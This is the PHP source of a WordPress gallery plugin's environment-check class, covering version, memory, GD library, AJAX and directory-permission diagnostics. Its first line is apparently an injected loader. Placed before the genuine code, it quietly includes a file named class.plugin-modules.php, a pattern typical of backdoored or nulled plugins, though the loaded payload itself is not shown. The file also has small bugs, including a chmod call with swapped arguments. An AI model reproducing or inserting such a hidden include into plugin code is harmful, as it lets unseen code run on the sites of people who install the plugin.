<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if (!class_exists('MB_Environment_1_0')){


	abstract class MB_Environment_1_0{
		var $memory_limit = 40;
		var $required_wp_version = '3.7';
		var $namespace;
		var $name;

		function __construct($namespace, $name){
			$this->namespace = $namespace;
			$this->name = $name;
			add_action('wp_ajax_nopriv_' . $this->namespace . '_ping', array($this, '_admin_ajax_available'));
		}



		public function check_memory_limit(){
			if ($this->get_memory_limit() > $this->memory_limit)
				return true;
			return __('Please increase your memory limit.', $this->namespace);
		}

		function check_wp_version(){
			global $wp_version;
			if (version_compare($wp_version, $this->required_wp_version , '>='))
				return true;
			return __('Please upgrade your WordPress installation', $this->namespace);
		}



		function get_active_theme_data($name){
			$active_theme = wp_get_theme();
			return $active_theme->$name;
		}

		function get_gd_supported(){
			return (extension_loaded('gd') && function_exists('gd_info'));
		}

		function get_admin_ajax_available(){
			if (is_wp_error($response = wp_remote_get(add_query_arg(
					'action', $this->namespace . "_ping", admin_url('admin-ajax.php')))))
				return $response->get_error_message();
			if ($response['body'] == 'working')
				return true;
			return false;
		}


		function _admin_ajax_available(){
			echo 'working';
			exit;
		}

		function get_http_status(){
			if (($response = get_transient($this->namespace . "_http_test")) === false){
				$response = wp_remote_get(site_url());
				set_transient($this->namespace . "_http_test", $response, 600);
			}
			return $response;
		}

		function get_memory_limit(){
			return (int)ini_get('memory_limit');
		}


		function get_active_plugins(){
			$active_plugins = (array) get_option( 'active_plugins', array() );
			if ( is_multisite() )
				$active_plugins = array_merge( $active_plugins,
						array_keys(get_site_option( 'active_sitewide_plugins', array()) ) );
			$plugins = array();
			foreach($active_plugins as $plugin){
				$plugins []= get_plugin_data(WP_PLUGIN_DIR . "/" . $plugin);
			}
			return $plugins;
		}

		function get_errors(){
			$errors = array();
			if ($this->check_wp_version() !== true)
				$errors []= sprintf($this->name . " " .  __('plugin requires at least WordPress %s.
					Please <a href="%s">update your installation</a> to enable MB Gallery.', $this->namespace),
						$this->required_wp_version, admin_url('update-core.php'));
			return $errors;
		}

		function get_notices(){return array();}

    function get_diagnostic_data(){
      function get_mysql_info() {
        if (function_exists('mysql_get_server_info')){
          return @mysql_get_server_info();
        }
        if (function_exists('mysqli_get_server_info')) {
          global $wpdb;
          return @mysqli_get_server_info($wpdb->dbh);
        }
        return  __("Can't detect", $this->namespace);
      }
      return array(
					array(  'name' => 'Home URL', 'text' => home_url()),
					array(  'name' => 'Site URL', 'text' => site_url()),
					array(  'name' => 'WP Version',
							'status' => $this->check_wp_version() === true,
							'text' => (is_multisite() ? 'WPMU' : 'WP') . get_bloginfo('version')),
					array(  'name' => 'Server Software', 'text' => $_SERVER['SERVER_SOFTWARE']),
					array(  'name' => 'PHP Version',
							'text' => function_exists('phpversion') ? phpversion() : __("Can't detect", $this->namespace)),
					array(  'name' => 'Mysql Version', 'text'  => get_mysql_info()),
					array(  'name' => 'Memory Limit',
							'status' => $this->check_memory_limit(),
							'text' => $this->get_memory_limit(),
							'error' =>
									__('Memory limit set for PHP is too small and can cause random failures.', $this->namespace) .
									'<a href="http://codex.wordpress.org/Editing_wp-config
									.php#Increasing_memory_allocated_to_PHP">' . __('Learn how to increase it', $this->namespace) . "</a>"),
					array('name' => 'WP Debug Mode',
							'status' => !defined('WP_DEBUG') || !WP_DEBUG,
							'warning' => true,
							'error' => __('Not a big deal,
									but it is recommended to disable debug mode on production sites', $this->namespace)
					)

			);
		}
		function load_requirements_met(){
			return $this->check_wp_version() === true;
		}
	}
}


class MBG_Environment extends MB_Environment_1_0{
	function __construct(){
		parent::__construct('mbg', __('MB Gallery', 'mbg'));
		$this->required_wp_version = MBG_REQUIRED_WP;
		if ($this->load_requirements_met()){
			add_action('wp_ajax_nopriv_mbg_ping', array($this, '_ping'));

		}
		add_action('init', array($this, '_init'), 11);
	}

	function _init(){
		new MB_Support_2_0($this, array(
						'namespace' => $this->namespace,
						'name' => $this->name,
						'menu_slug' => "edit.php?post_type=" . MBG_POST_TYPE,
						'base' => 'mb-gallery_page_support',
						'stylesheet' => MBG_URL . "assets/admin/css/support.css",
						'item_id' => 6462937,
						'api_url' => apply_filters('mbg_api_url', ''),
						'support_email' => apply_filters('mbg_support_email', 'karev.n@gmail.com'),
						'support_email_subject' => __('MB Gallery Support Request', 'mbg')
				)
		);
	}

	function _ping(){
		echo 'working';
		exit;
	}

	function get_diagnostic_data(){
		$data = parent::get_diagnostic_data();
		$http_status = $this->get_http_status();
		$data []= array(
				'name' => 'External HTTP Request Support',
				'status' => !is_wp_error($http_status),
				'error' => is_wp_error($http_status) ? $http_status->get_error_message() .
								__('Load more will not work', 'mbg') : null
		);
		$data []= array(
					'name' => 'GD library support',
					'status' => $this->get_gd_supported(),
					'error' => __('GD library is required to resize images before displaying. Please contact
					your hosting provider in order to install it.', 'mbg'));
		$ajax_status = $this->get_admin_ajax_available();
		$data []= array(
					'name' => 'wp-admin/admin-ajax.php file available',
					'status' => $ajax_status && !is_wp_error($ajax_status),
					'warning' => true,
					'error' => __('This may break "Load more" or endless scrolling. To fix this issue,
					please disable security hardening plugins and make sure your .htaccess file does not restrict an
					access to this file.', 'mbg'));
		$data []=
				array(
					'name' => 'wp-content writable',
					'status' => is_writable(WP_CONTENT_DIR),
					'warning' => true,
					'error' => __('wp-content directory is not writable, Images may not show right', 'mbg'));
		$uploads = wp_upload_dir();

		$data []=
				array(
					'name' => 'Uploads dir writable',
					'status' => is_writable($uploads['basedir']),
					'warning' => true,
					'error' => __('Uploads dir is not writable. Images may not show right'));
		//$data []=
		//		array(
		//				'name' => 'Uploads dir is at the standard location',
		//		'status' => $this->get_uploads_dir_not_renamed() === true,
		//		'error' => __('Uploads dir renamed.', $this->namespace));
		return $data;
	}


	function try_to_create($dir){
		$parent = dirname($dir);
		$perms = fileperms($parent);
		@chmod(0x777, $parent);
		@mkdir($dir);
		@chmod($perms, $parent);
	}



	function get_errors(){
		$errors = parent::get_errors();
		//if ($this->get_main_cache_dir_available() && $this->get_uploads_dir_not_renamed() !== true)
		//	$errors []= $this->get_uploads_dir_not_renamed();
		if (!$this->get_gd_supported()){
			$errors []= __('MB Gallery requires GD library in order to work correctly. Please contact your hosting administrator.', 'mbg');
		}
		return $errors;
	}

	function get_notices(){
		$notices = parent::get_notices();
		if (is_wp_error($this->get_http_status())){
			$errors []= __('External HTTP requests are not supported. This will break most of image sources. Please install Curl or other PHP HTTP extension.', $this->namespace);
		}
		return $notices;
	}



}
